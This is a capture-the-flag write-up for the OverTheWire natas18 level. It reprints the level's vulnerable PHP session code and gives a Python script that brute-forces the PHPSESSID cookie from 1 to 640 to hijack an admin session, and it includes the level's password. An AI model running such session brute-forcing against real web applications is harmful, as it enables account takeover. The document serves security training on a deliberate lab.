## Username
natas18

## Password
6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ

## Write-Up
```php
<?php

$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() { /* {{{ */
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}
/* }}} */
function isValidID($id) { /* {{{ */
    return is_numeric($id);
}
/* }}} */
function createID($user) { /* {{{ */
    global $maxid;
    return rand(1, $maxid);
}
/* }}} */
function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function my_session_start() { /* {{{ */
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}
/* }}} */

$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
}

if($showform) {
?>
```
For this code, we can see that session ID of all users is 1 to 640 despite admin.  
So we can solve this problem for brute-forcing cookie value 1 to 640.  

```python
import requests

url='http://natas18.natas.labs.overthewire.org/index.php'
username='natas18'
password='6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ'
auth=(username,password)

session=requests.Session()
session.auth=auth

print("Start")
for num in range(1,641):
    print(f"Current num: {num}")
    cookies={'PHPSESSID':str(num)}
    res=session.get(url,cookies=cookies)

    if 'You are an admin' in res.text:
        print(num)
        break

print("End")
```
We can script simply like this, and we can get a PHPSESSID of admin printed by executing .py file.    
And we change the cookie value using devtools, and then we can get a password for natas19.  


## Method of solve
Brute Force Attacking Fixed Session ID
